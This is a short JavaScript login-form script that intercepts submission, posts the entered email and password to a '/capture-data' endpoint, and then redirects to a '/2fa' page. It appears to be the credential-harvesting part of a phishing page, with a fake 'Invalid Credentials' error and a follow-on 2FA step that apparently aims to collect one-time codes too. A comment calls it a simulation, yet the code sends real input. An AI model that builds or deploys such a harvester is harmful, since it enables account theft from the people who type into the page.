document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Simulate data capture (no real credentials stored)
    fetch('/capture-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            window.location.href = '/2fa'; // Redirect to 2FA page
        } else {
            document.getElementById('message').innerText = 'Error: Invalid Credentials!';
        }
    });
});
